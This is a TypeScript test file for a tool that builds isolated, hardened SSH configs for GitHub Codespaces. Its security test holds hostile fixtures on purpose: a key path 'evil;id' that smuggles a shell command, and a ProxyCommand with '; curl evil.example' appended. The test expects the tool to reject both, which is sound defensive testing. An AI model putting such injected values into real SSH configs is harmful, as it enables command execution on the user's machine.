import { mkdir, mkdtemp, readFile, rm, stat, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, expect, test } from 'vitest';
import { prepareIsolatedCodespaceSshConfig } from '../src/codespaces-ssh.js';
import { buildScpUploadArgs, buildSshArgs } from '../src/transport.js';

const tempDirs: string[] = [];
afterEach(async () => {
  await Promise.all(tempDirs.splice(0).map(dir => rm(dir, { recursive: true, force: true })));
});

test('creates an isolated 0600 OpenSSH config, resolves tilde ~/.ssh/codespaces.auto (#9817), and wires -F + TOFU known_hosts', async () => {
  const root = await mkdtemp(join(tmpdir(), 'router-cs-ssh-'));
  tempDirs.push(root);
  const isolatedHome = join(root, 'fake-home');
  await mkdir(join(isolatedHome, '.ssh'), { recursive: true, mode: 0o700 });

  const rawGhConfig = [
    'Host cs.octocat-literate-space-parakeet-77v9.main',
    '\tUser codespace',
    '\tProxyCommand /opt/homebrew/bin/gh cs ssh -c octocat-literate-space-parakeet-77v9 --stdio -- -i ~/.ssh/codespaces.auto',
    '\tUserKnownHostsFile=/dev/null',
    '\tStrictHostKeyChecking no',
    '\tControlMaster auto',
    '\tIdentityFile ~/.ssh/codespaces.auto',
    '',
  ].join('\n');

  const prepared = await prepareIsolatedCodespaceSshConfig({
    codespaceName: 'octocat-literate-space-parakeet-77v9',
    homeDir: isolatedHome,
    parentTempDir: root,
    runGhConfig: async () => rawGhConfig,
  });

  try {
    expect(prepared.hostAlias).toBe('cs.octocat-literate-space-parakeet-77v9.main');
    expect(prepared.sshTarget).toBe('codespace@cs.octocat-literate-space-parakeet-77v9.main');
    expect(prepared.strictHostKeyChecking).toBe('accept-new');

    const cfgStat = await stat(prepared.configFile);
    const khStat = await stat(prepared.knownHostsFile);
    expect(cfgStat.mode & 0o777).toBe(0o600);
    expect(khStat.mode & 0o777).toBe(0o600);

    const sanitizedText = await readFile(prepared.configFile, 'utf8');
    expect(sanitizedText).not.toContain('StrictHostKeyChecking no');
    expect(sanitizedText).not.toContain('/dev/null');
    expect(sanitizedText).not.toContain('codespaces.auto');
    expect(sanitizedText).toContain('ControlMaster no');
    expect(sanitizedText).toContain(
      'ProxyCommand /opt/homebrew/bin/gh cs ssh -c octocat-literate-space-parakeet-77v9 --stdio',
    );

    const sshArgs = buildSshArgs(prepared.sshTarget, ['true'], {
      configFile: prepared.configFile,
      knownHostsFile: prepared.knownHostsFile,
      strictHostKeyChecking: prepared.strictHostKeyChecking,
    });
    expect(sshArgs).toContain('-F');
    expect(sshArgs).toContain(prepared.configFile);
    expect(sshArgs).toContain('StrictHostKeyChecking=accept-new');

    const scpArgs = buildScpUploadArgs('/tmp/chk.enc', prepared.sshTarget, '/var/tmp/chk.enc', {
      configFile: prepared.configFile,
      knownHostsFile: prepared.knownHostsFile,
      strictHostKeyChecking: prepared.strictHostKeyChecking,
    });
    expect(scpArgs).toContain('-F');
    expect(scpArgs).toContain(prepared.configFile);
  } finally {
    await prepared.cleanup();
  }
});

test('expands existing ~/.ssh/codespaces.auto and rejects IdentityFile / ProxyCommand shell or /dev/null bypasses', async () => {
  const root = await mkdtemp(join(tmpdir(), 'router-cs-ssh-sec-'));
  tempDirs.push(root);
  const isolatedHome = join(root, 'fake-home');
  await mkdir(join(isolatedHome, '.ssh'), { recursive: true, mode: 0o700 });
  const existingKey = join(isolatedHome, '.ssh', 'codespaces.auto');
  await writeFile(existingKey, 'dummy-key\n', { mode: 0o600 });

  const prepared = await prepareIsolatedCodespaceSshConfig({
    codespaceName: 'my-space-01',
    homeDir: isolatedHome,
    parentTempDir: root,
    runGhConfig: async () =>
      [
        'Host cs.my-space-01.main',
        '  User vscode',
        '  ProxyCommand /usr/local/bin/gh cs ssh -c my-space-01 --stdio -- -i ~/.ssh/codespaces.auto',
        '  IdentityFile ~/.ssh/codespaces.auto',
      ].join('\n'),
  });
  try {
    const text = await readFile(prepared.configFile, 'utf8');
    expect(text).toContain(`IdentityFile ${existingKey}`);
    expect(text).toContain(`-- -i ${existingKey}`);
  } finally {
    await prepared.cleanup();
  }

  // Even when a malicious path exists on disk, IdentityFile with `;` or `%` must be rejected before ProxyCommand interpolation
  const evilKeyPath = join(root, 'evil;id');
  await writeFile(evilKeyPath, 'x\n', { mode: 0o600 });
  await expect(
    prepareIsolatedCodespaceSshConfig({
      codespaceName: 'my-space-01',
      homeDir: isolatedHome,
      parentTempDir: root,
      runGhConfig: async () =>
        [
          'Host cs.my-space-01.main',
          '  User vscode',
          '  ProxyCommand /usr/local/bin/gh cs ssh -c my-space-01 --stdio',
          `  IdentityFile ${evilKeyPath}`,
        ].join('\n'),
    }),
  ).rejects.toThrow(/IdentityFile/i);

  await expect(
    prepareIsolatedCodespaceSshConfig({
      codespaceName: 'my-space-01',
      homeDir: isolatedHome,
      parentTempDir: root,
      runGhConfig: async () =>
        [
          'Host cs.my-space-01.main',
          '  User vscode',
          '  ProxyCommand /usr/local/bin/gh cs ssh -c my-space-01 --stdio; curl evil.example',
        ].join('\n'),
    }),
  ).rejects.toThrow(/ProxyCommand/i);

  expect(() =>
    buildSshArgs('vscode@cs.my-space-01.main', ['true'], {
      strictHostKeyChecking: 'accept-new',
    }),
  ).toThrow(/knownHostsFile/i);

  expect(() =>
    buildSshArgs('vscode@cs.my-space-01.main', ['true'], {
      strictHostKeyChecking: 'accept-new',
      knownHostsFile: '/dev/null',
    }),
  ).toThrow(/\/dev/i);
});
